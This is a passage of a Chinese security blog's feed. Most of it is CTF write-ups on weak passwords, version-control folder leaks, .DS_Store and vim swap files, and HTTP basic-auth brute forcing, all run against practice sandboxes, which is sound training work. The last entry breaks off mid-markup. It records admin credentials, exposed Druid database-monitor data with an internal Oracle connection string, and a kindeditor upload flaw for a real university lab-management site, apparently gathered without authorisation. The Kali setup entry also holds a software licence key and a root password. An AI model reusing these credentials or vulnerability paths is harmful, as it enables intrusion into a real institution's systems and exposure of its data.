src="https://static.ctfhub.com/writeup/Skill/Web/密码口令/弱口令/hU9v9oJufMduQ8miFiZnWa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt=""><a href="https://static.ctfhub.com/writeup/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/%E5%BC%B1%E5%8F%A3%E4%BB%A4/hU9v9oJufMduQ8miFiZnWa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim">https://static.ctfhub.com/writeup/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/%E5%BC%B1%E5%8F%A3%E4%BB%A4/hU9v9oJufMduQ8miFiZnWa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim</a></p><p>好的 这里可以看到 当密码为<code>admin888</code>​的时候 对比其他密码不对的时候返回的长度有变化</p><p>则打开<code>response</code>​查看，看到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HG泄露</title>
      <link href="/2024/11/12/HG%E6%B3%84%E9%9C%B2/"/>
      <url>/2024/11/12/HG%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h1><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p>​<code>./rip-hg.pl -u http://challenge-a93378720f5e62ef.sandbox.ctfhub.com:10800/.hg/</code>​</p><p>flag_237051366.txt</p><p>​<code>http://challenge-a93378720f5e62ef.sandbox.ctfhub.com:10800/flag_237051366.txt</code>​</p><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>svn泄露</title>
      <link href="/2024/11/12/svn%E6%B3%84%E9%9C%B2/"/>
      <url>/2024/11/12/svn%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h1><p><em>SVN是源代码本本管理软件。使用SVN管理本地代码过程中，会生成一个名为.svn的隐藏文件夹，其中包含重要的源码信息。网站管理员在发布代码时，没有使用导出功能，直接进行复制粘贴。</em><br>漏洞例子：<code>xxxx/.svn/entries</code>​</p><p>使用<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><p><a href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper：Rip Web 可访问（分布式）版本控制系统：SVN/GIT/HG… —- kost/dvcs-ripper: Rip web accessible (distributed) version control systems: SVN/GIT/HG…</a></p><p>Rip Web 可访问（分布式）版本控制系统：SVN、GIT、Mercurial/hg、bzr、…</p><p>即使目录浏览关闭，它也可以翻录存储库。</p><p>确保将自己置于要下载/克隆存储库的空目录中。</p><p>​<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code>​</p><p>安装依赖</p><p>​<code>git clone https://github.com/kost/dvcs-ripper.git</code>​下载仓库</p><p>进入文件夹使用ripper</p><p>​<code>./rip-svn.pl -u http://challenge-8efe9a7f8fc2b4e1.sandbox.ctfhub.com:10800/.svn/</code>​</p><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git泄露,index</title>
      <link href="/2024/11/12/git%E6%B3%84%E9%9C%B2,index/"/>
      <url>/2024/11/12/git%E6%B3%84%E9%9C%B2,index/</url>
      
        <content type="html"><![CDATA[<h1 id="git泄露-index"><a href="#git泄露-index" class="headerlink" title="git泄露,index"></a>git泄露,index</h1><ul><li>Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区</li></ul><p>对于这题，和上面一题常规流程，打开GitHack，扫描该网址，就出现一个txt文件，打开就是flag。</p><p>​<img src="assets/image-20241112132805-z577ao6.png" alt="image">​</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git泄露,stash</title>
      <link href="/2024/11/12/git%E6%B3%84%E9%9C%B2,stash/"/>
      <url>/2024/11/12/git%E6%B3%84%E9%9C%B2,stash/</url>
      
        <content type="html"><![CDATA[<h1 id="git泄露-stash"><a href="#git泄露-stash" class="headerlink" title="git泄露,stash"></a>git泄露,stash</h1><ul><li>stash是git的一个操作命令</li><li>git stash list 查看隐藏的记录</li><li>git stash pop 恢复隐藏的内容，同时删除隐藏记录</li><li>git stash apply 恢复隐藏的内容，但不会删除隐藏记录</li><li>使用stash pop/apply可以选择恢复哪条记录，如恢复stash@{1}记录,则使用git stash pop stash@{1}或者git stash apply stash@{1}</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git泄露,log</title>
      <link href="/2024/11/12/git%E6%B3%84%E9%9C%B2,log/"/>
      <url>/2024/11/12/git%E6%B3%84%E9%9C%B2,log/</url>
      
        <content type="html"><![CDATA[<h1 id="git泄露-log"><a href="#git泄露-log" class="headerlink" title="git泄露,log"></a>git泄露,log</h1><p>使用githack工具还原git库,git库里记录文件操作,可以查询信息</p><p>注意要使用python2 运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://challenge-408f3b6ae078d0dc.sandbox.ctfhub.com:10800/.git/</span><br></pre></td></tr></table></figure><p>​<img src="assets/image-20241112131527-7l2nh1e.png" alt="image">​</p><p>使用<code>git log</code>​显示信息</p><p>‍</p><p>​<img src="assets/image-20241112131653-uwasz8c.png" alt="image">​</p><p>使用<code>git diff &lt;comment&gt;</code>​查看操作信息</p><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DS_Store</title>
      <link href="/2024/11/12/DS_Store/"/>
      <url>/2024/11/12/DS_Store/</url>
      
        <content type="html"><![CDATA[<h1 id="DS-Store"><a href="#DS-Store" class="headerlink" title="DS_Store"></a>DS_Store</h1><h2 id="存放"><a href="#存放" class="headerlink" title="存放"></a>存放</h2><p>默认情况下，Mac OS X的<a href="https://zh.wikipedia.org/wiki/Finder" title="Finder">Finder</a>程序会在进行存取的每个目录下创建.DS_Store文件，甚至是在远程系统上的目录（例如通过<a href="https://zh.wikipedia.org/wiki/%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%A8%8A%E6%81%AF%E5%8D%80%E5%A1%8A" title="服务器讯息区块">SMB</a>连接或者<a href="https://zh.wikipedia.org/wiki/%E8%8B%B9%E6%9E%9C%E6%96%87%E4%BB%B6%E5%8D%8F%E8%AE%AE">苹果文件协议</a>连接来共享的目录），并且甚至如果用户仅仅通过移动该目录的Finder窗口自定义了其显示。 这与既存的在先前版本的Finder中为了同样目的所使用的方式的系统形成了对比，先前的只会放置一些不可见文件于卷的根目录下（甚至在外部<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F" title="文件系统">文件系统</a>上），并总是将整个驱动器的所有目录的设置与元数据存储在这类文件的单一集合中。</p><h2 id="禁用或启用自动生成"><a href="#禁用或启用自动生成" class="headerlink" title="禁用或启用自动生成"></a>禁用或启用自动生成</h2><p>可通过Terminal输入以下命令来禁止或恢复在网络文件夹上自动生成.DS_Store：</p><ul><li>禁止.DS_store生成：</li></ul><p>​<code>defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE</code>​</p><ul><li>恢复.DS_store生成：</li></ul><p>​<code>defaults delete com.apple.desktopservices DSDontWriteNetworkStores</code>​</p><p>可通过Terminal输入以下命令来禁止或恢复在移动设备自动生成.DS_Store：</p><ul><li>禁止.DS_store生成：</li></ul><p>​<code>defaults write com.apple.desktopservices DSDontWriteUSBStores -bool TRUE</code>​</p><ul><li>恢复.DS_store生成：</li></ul><p>​<code>defaults delete com.apple.desktopservices DSDontWriteUSBStores</code>​</p><p>​<img src="assets/image-20241112030137-b64jqpm.png" alt="image">​</p><p>使用cat命令读取</p><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim缓存</title>
      <link href="/2024/11/12/vim%E7%BC%93%E5%AD%98/"/>
      <url>/2024/11/12/vim%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h1><p><strong>Vim</strong> 编辑器在编辑文件时会创建临时缓存文件，这些文件通常被称为交换文件。当 Vim 正常关闭时，这些缓存文件会被自动删除。然而，如果 Vim 异常退出，例如由于系统崩溃或其他原因，这些缓存文件不会被删除，从而可能导致敏感信息泄露。</p><p>Vim 缓存文件的恢复</p><p>Vim 缓存文件的扩展名通常为  <em>.swp</em>， <em>.swo</em>， <em>.swn</em> 等，这些文件保存了 Vim 编辑会话的状态。如果 Vim 意外退出，可以通过这些缓存文件恢复未保存的更改。例如，如果编辑 <em>index.php</em> 文件时 Vim 异常退出，可能会生成名为  <em>.index.php.swp</em> 的交换文件。如果再次异常退出，将生成  <em>.index.php.swo</em>，以此类推。</p><p>恢复 Vim 缓存文件的方法</p><p>要恢复 Vim 缓存文件，可以将缓存文件拷贝到 Linux 系统中，并使用 Vim 的恢复功能。以下是恢复缓存文件的步骤：</p><ol><li>将  <em>.swp</em> 文件拷贝到 Linux 系统中。</li><li>使用 Vim 打开原始文件，例如 <em>vim index.php</em>。</li><li>如果 Vim 检测到交换文件，它会提示是否恢复。选择恢复，Vim 会尝试从交换文件中恢复数据。</li><li>如果直接有交换文件，可以使用 <em>vim -r .index.php.swp</em> 命令来恢复文件内容。</li></ol><p>注意事项</p><ul><li>在处理 Vim 缓存文件时，需要注意文件权限和安全性，以防止未授权访问。</li><li>恢复过程中可能需要处理文件名的变化，特别是在从 Windows 系统传输到 Linux 系统时。</li><li>在 Web 安全领域，Vim 缓存文件可能被用作信息泄露的途径。例如，在 CTF（Capture The Flag）竞赛中，参赛者可能需要寻找这些缓存文件来获取隐藏的 flag。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>响应包源代码查看</title>
      <link href="/2024/11/12/%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81%E6%9F%A5%E7%9C%8B/"/>
      <url>/2024/11/12/%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81%E6%9F%A5%E7%9C%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="响应包源代码查看"><a href="#响应包源代码查看" class="headerlink" title="响应包源代码查看"></a>响应包源代码查看</h1><p>直接f12找flag</p><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP基本认证</title>
      <link href="/2024/11/12/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/"/>
      <url>/2024/11/12/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP基本认证"><a href="#HTTP基本认证" class="headerlink" title="HTTP基本认证"></a>HTTP基本认证</h1><h4 id="3-客户端请求（有认证信息）"><a href="#3-客户端请求（有认证信息）" class="headerlink" title="3.客户端请求（有认证信息）"></a>3.客户端请求（有认证信息）</h4><p>用户名“Aladdin”，密码 “open sesame”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /private/index.html HTTP/1.0</span><br><span class="line">Host: localhost</span><br><span class="line">Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</span><br></pre></td></tr></table></figure><p><a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">HTTP基本认证 - 维基百科，自由的百科全书</a></p><p>根据http基本认证的原理,用户名密码写在Authorization里,用burp撞库就行</p><p>根据返回值可以确定使用了什么加密方法</p><p>​<img src="assets/image-20241112014013-zaj2znh.png" alt="image">​</p><p>​<img src="assets/image-20241112013659-0o5lcuj.png" alt="image">​</p><p>​<img src="assets/image-20241112013632-zq86wxd.png" alt="image">​</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF基础知识——HTTP1.1 请求方法</title>
      <link href="/2024/11/12/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E2%80%94%E2%80%94HTTP1.1%20%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/"/>
      <url>/2024/11/12/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E2%80%94%E2%80%94HTTP1.1%20%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF基础知识——HTTP1-1-请求方法"><a href="#CTF基础知识——HTTP1-1-请求方法" class="headerlink" title="CTF基础知识——HTTP1.1 请求方法"></a>CTF基础知识——HTTP1.1 请求方法</h1><p>HTTP请求的方法： HTTP/1.1协议中共定义了八种方法（有时也叫“动作”），来表明Request-URL指定的资源不同的操作方式<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。 HTTP1.1新增了五种请求方法：OPTIONS, PUT,<br>DELETE, TRACE 和 CONNECT 方法</p><p>1、OPTIONS</p><p>返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性</p><p>2、HEAD</p><p>向服务器索与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。</p><p>3、GET</p><p>向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中，例如在Web<br>Application中，其中一个原因是GET可能会被网络蜘蛛等随意访问。Loadrunner中对应get请求函数：web_link和web_url</p><p>4、POST</p><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>Loadrunner中对应POST请求函数：web_submit_data,web_submit_form</p><p>5、PUT</p><p>向指定资源位置上传其最新内容</p><p>6、DELETE</p><p>请求服务器删除Request-URL所标识的资源</p><p>7、TRACE</p><p>回显服务器收到的请求，主要用于测试或诊断</p><p>8、CONNECT</p><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><p>注意：</p><p>1）方法名称是区分大小写的，当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Mothod Not<br>Allowed）；当服务器不认识或者不支持对应的请求方法时，应返回状态码501（Not Implemented）。</p><p>2）HTTP服务器至少应该实现GET和HEAD/POST方法，其他方法都是可选的，此外除上述方法，特定的HTTP服务器支持扩展自定义的方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比赛形式</title>
      <link href="/2024/11/12/%E6%AF%94%E8%B5%9B%E5%BD%A2%E5%BC%8F/"/>
      <url>/2024/11/12/%E6%AF%94%E8%B5%9B%E5%BD%A2%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h1><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTF比赛一般分为线上赛和线下赛。通常来说，线上赛多为<code>初赛</code>​, 线下赛多为<code>决赛</code>​, 但是也不排除直接进行</p><h3 id="线上"><a href="#线上" class="headerlink" title="线上"></a>线上</h3><p>选手通过主办方搭建的比赛平台在线注册，在线做题并提交flag，线上比赛多为解题模式，攻防模式较为少见。通常来说对于长时间未解出的题目，主办方会酌情给出提示(<code>Hint</code>​)来帮助选手做题。</p><h3 id="线下"><a href="#线下" class="headerlink" title="线下"></a>线下</h3><p>选手前往比赛所在地，现场接入比赛网络进行比赛，线下多为AWD模式，近年来随着比赛赛制的不断革新，线下赛也会出现多种模式混合进行，例如结合<strong>解题+AWD</strong>，<strong>解题+RW</strong> 等等</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;46ea72b1f8baa828b6fdab002a8ffdff&#125;</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="/2024/11/12/CTF%E7%AE%80%E4%BB%8B/"/>
      <url>/2024/11/12/CTF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF简介"><a href="#CTF简介" class="headerlink" title="CTF简介"></a>CTF简介</h1><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CTF（<strong>C</strong>apture <strong>T</strong>he <strong>F</strong>lag，夺旗赛）CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有<code>一定格式的字符串</code>​或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</p><p>flag所表示的为目标服务器上存储的一些<code>敏感机密</code>​的信息, 这些信息正常情况下是不能对外暴露的。选手利用目标的一些漏洞，获取到flag，其表示的即为在真实的黑客攻击中窃取到的机密信息。</p><p>一般情况下flag拥有固定格式为<code>flag&#123;xxxxx&#125;</code>​，有些比赛会把flag关键词替换，例如我们CTFHub平台的flag为<code>ctfhub&#123;xxxxx&#125;</code>​，利用固定格式来反推flag也是一种常见的解题思路</p><p>通常来说CTF是以团队为单位进行参赛。每个团队3-5人(具体根据主办方要求决定)，在整个比赛过程中既要每个选手拥有某个方向的漏洞挖掘能力，也要同队选手之间的相互配合。</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;c18732f48a96c40d40a06e74b1305706&#125;</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装</title>
      <link href="/2024/11/10/kali%E5%AE%89%E8%A3%85/"/>
      <url>/2024/11/10/kali%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h1><h1 id="VMwareWorkstation安装"><a href="#VMwareWorkstation安装" class="headerlink" title="VMwareWorkstation安装"></a>VMwareWorkstation安装</h1><p>密钥【MC60H-DWHD5-H80U9-6V85M-8280D】</p><div class="table-container"><table><thead><tr><th>下载通道<strong>①</strong>迅雷云盘丨下载链接：<br /><br /><a href="https://pan.xunlei.com/s/VO5vyCixCHg05GhqfwdlavyhA1?pwd=84cu">https://pan.xunlei.com/s/VO5vyCixCHg05GhqfwdlavyhA1?pwd=84cu</a></th></tr></thead><tbody><tr><td>下载通道<strong>②</strong>百度网盘丨下载链接：<br /><a href="https://pan.baidu.com/s/1nns2lfn4bNaS4HuPObUncA?pwd=6789">https://pan.baidu.com/s/1nns2lfn4bNaS4HuPObUncA?pwd=6789</a><br />提取码：6789</td></tr></tbody></table></div><h1 id="kali下载"><a href="#kali下载" class="headerlink" title="kali下载"></a>kali下载</h1><p>root</p><p>616420</p><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">获取时间 |卡利Linux —- Get Kali | Kali Linux</a></p><p>​<img src="assets/image-20241110214823-sfrmvzx.png" alt="image">​</p><h2 id="打开kali"><a href="#打开kali" class="headerlink" title="打开kali"></a>打开kali</h2><p>​<img src="assets/image-20241110215337-oowx52z.png" alt="image">​</p><p>解压的kali文件夹中打开vmx文件即可打开kali虚拟机</p><h2 id="登录kali"><a href="#登录kali" class="headerlink" title="登录kali"></a>登录kali</h2><p>默认账户密码</p><p>kali</p><p>​<img src="assets/image-20241110215510-fvls1dv.png" alt="image">​</p><h2 id="快照创建"><a href="#快照创建" class="headerlink" title="快照创建"></a>快照创建</h2><p>​<img src="assets/image-20241110215211-og124ym.png" alt="image">​</p><h1 id="ip地址查看"><a href="#ip地址查看" class="headerlink" title="ip地址查看"></a>ip地址查看</h1><ul><li><p>官方:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure></li><li><p>常用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></li></ul><h1 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h1><p>如果网络无法连接,可在虚拟网络编辑器中修改桥接网路</p><p>​<img src="assets/image-20241110225614-jafdz4t.png" alt="image">​</p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验室综合管理与服务平台-登录界面</title>
      <link href="/2024/10/30/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0-%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2/"/>
      <url>/2024/10/30/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0-%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="实验室综合管理与服务平台-登录界面"><a href="#实验室综合管理与服务平台-登录界面" class="headerlink" title="实验室综合管理与服务平台-登录界面"></a>实验室综合管理与服务平台-登录界面</h1><p><a href="https://mdsysgl.mdit.edu.cn/sysgl/">实验室综合管理与服务平台-登录界面</a><br>000000<br>Admin@1234<br><a href="https://mdsysgl.mdit.edu.cn/sysgl/index/login_toIndex">实验室综合管理与服务平台</a><br>测试<br>cs11111222<br>Admin@1234<br><a href="https://mdsysgl.mdit.edu.cn/sysgl/">实验室综合管理与服务平台-登录界面</a></p><p><a href="https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/demo.jsp">https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/demo.jsp</a></p><div class="table-container"><table><thead><tr><th>* 用户名</th><th>tysys</th><th>指定建立连接时使用的用户名</th></tr></thead><tbody><tr><td>* 连接地址</td><td>jdbc:oracle:thin:@192.168.21.131:1521/shitan</td><td>jdbc 连接字符串</td></tr><tr><td>* 数据库类型</td><td>oracle</td><td>数据库类型</td></tr><tr><td>* 驱动类名</td><td>oracle. jdbc. driver. OracleDriver</td><td>jdbc 驱动的类名</td></tr><tr><td>* filter 类名</td><td>com. alibaba. druid. filter. stat. StatFilter</td><td>filter 的类名</td></tr><tr><td>* 获取连接时检测</td><td>false</td><td>是否在获得连接后检测其可用性</td></tr><tr><td>* 空闲时检测</td><td>true</td><td>是否在连接空闲一段时间后检测其可用性</td></tr><tr><td>* 连接放回连接池时检测</td><td>false</td><td>是否在连接放回连接池后检测其可用性</td></tr><tr><td>* 初始化连接大小</td><td>1</td><td>连接池建立时创建的初始化连接数</td></tr><tr><td>* 最小空闲连接数</td><td>1</td><td>连接池中最小的活跃连接数</td></tr><tr><td>* 最大连接数</td><td>8</td><td>连接池中最大的活跃连接数</td></tr><tr><td>* 查询超时时间</td><td>0</td><td>查询超时时间</td></tr><tr><td>* 事务查询超时时间</td><td>0</td><td>事务查询超时时间</td></tr><tr><td>* 登录超时时间</td><td>0</td><td></td></tr><tr><td>* 连接有效性检查类名</td><td>com. alibaba. druid. pool. vendor. OracleValidConnectionChecker</td><td></td></tr><tr><td>* ExceptionSorter 类名</td><td>com. alibaba. druid. pool. vendor. OracleExceptionSorter</td><td></td></tr><tr><td>* 默认 autocommit 设置</td><td>true</td><td></td></tr><tr><td>* 默认只读设置</td><td>null</td><td></td></tr><tr><td>* 默认事务隔离</td><td>null</td><td></td></tr><tr><td>等待次数</td><td>248</td><td>获取连接时最多等待多少次</td></tr><tr><td>等待最大时长</td><td>221867</td><td>获取连接时最多等待多长时间</td></tr><tr><td>等待线程数量</td><td>0</td><td>当前等待获取连接的线程数</td></tr><tr><td>事务启动数</td><td>1207</td><td>事务开始的个数</td></tr><tr><td>事务时间分布</td><td>123,744,100,111,38,90,1</td><td>事务运行时间分布，分布区间为[0-10 ms, 10-100 ms, 100-1 s, 1-10 s, 10-100 s, &gt;100 s]</td></tr><tr><td>池中连接数</td><td>2</td><td>当前连接池中的数目</td></tr><tr><td>池中连接数峰值</td><td>8</td><td>连接池中数目的峰值</td></tr><tr><td>池中连接数峰值时间</td><td>2024-10-27 22:09:51</td><td>连接池数目峰值出现的时间</td></tr><tr><td>活跃连接数</td><td>0</td><td>当前连接池中活跃连接数</td></tr><tr><td>活跃连接数峰值</td><td>8</td><td>连接池中活跃连接数峰值</td></tr><tr><td>活跃连接数峰值时间</td><td>2024-10-27 20:54:58</td><td>活跃连接池峰值出现的时间</td></tr><tr><td>逻辑连接打开次数</td><td>10441</td><td>产生的逻辑连接建立总数</td></tr><tr><td>逻辑连接关闭次数</td><td>10441</td><td>产生的逻辑连接关闭总数</td></tr><tr><td>逻辑连接错误次数</td><td>0</td><td>产生的逻辑连接出错总数</td></tr><tr><td>物理连接打开次数</td><td>60</td><td>产生的物理连接建立总数</td></tr><tr><td>物理关闭数量</td><td>58</td><td>产生的物理关闭总数</td></tr><tr><td>物理连接错误次数</td><td>0</td><td>产生的物理连接失败总数</td></tr><tr><td>执行数</td><td>11844</td><td></td></tr><tr><td>错误数</td><td>2</td><td></td></tr><tr><td>提交数</td><td>1207</td><td></td></tr><tr><td>回滚数</td><td>0</td><td></td></tr><tr><td>PSCache 访问次数</td><td>0</td><td>PSCache 访问总数</td></tr><tr><td>PSCache 命中次数</td><td>0</td><td>PSCache 命中次数</td></tr><tr><td>PSCache 丢失次数</td><td>0</td><td>PSCache 丢失次数</td></tr><tr><td>连接持有时间分布</td><td>5903,2491,949,935,70,90,1,2</td><td>连接持有时间分布，分布区间为[0-1 ms, 1-10 ms, 10-100 ms, 100 ms-1 s, 1-10 s, 10-100 s, 100-1000 s, &gt;1000 s]</td></tr><tr><td>Clob 打开次数</td><td>1</td><td>Clob 打开数</td></tr><tr><td>Blob 打开次数</td><td>0</td><td>Blob 打开数</td></tr><tr><td>活跃连接堆栈查看</td><td><a href="https://mdsysgl.mdit.edu.cn/sysgl/druid/activeConnectionStackTrace.html?datasourceId=25211438">View</a></td><td>StackTrace for active Connection. View JSON API\ ( <a href="https://mdsysgl.mdit.edu.cn/sysgl/druid/activeConnectionStackTrace-1477347134.json">https://mdsysgl.mdit.edu.cn/sysgl/druid/activeConnectionStackTrace-1477347134.json</a> )</td></tr><tr><td>连接池中连接信息</td><td><a href="https://mdsysgl.mdit.edu.cn/sysgl/druid/connectionInfo.html?datasourceId=1477347134">View</a></td><td>Info for polling connection. View JSON API\ ( <a href="https://mdsysgl.mdit.edu.cn/sysgl/druid/connectionInfo-1477347134.json">https://mdsysgl.mdit.edu.cn/sysgl/druid/connectionInfo-1477347134.json</a> )</td></tr><tr><td>sql 列表</td><td><a href="https://mdsysgl.mdit.edu.cn/sysgl/druid/sql.html?dataSourceId=1477347134">View</a></td><td>Info for SQL. View JSON API\ ( <a href="https://mdsysgl.mdit.edu.cn/sysgl/druid/sql.json?dataSourceId=1477347134">https://mdsysgl.mdit.edu.cn/sysgl/druid/sql.json?dataSourceId=1477347134</a> )</td></tr><tr><td>tysys_kfk</td><td></td><td></td></tr><tr><td><a href="https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/upload_json.jsp?dir=image">mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/upload_json.jsp?dir=image</a></td><td></td><td></td></tr><tr><td>kindeditor 漏洞</td><td></td><td></td></tr><tr><td><a 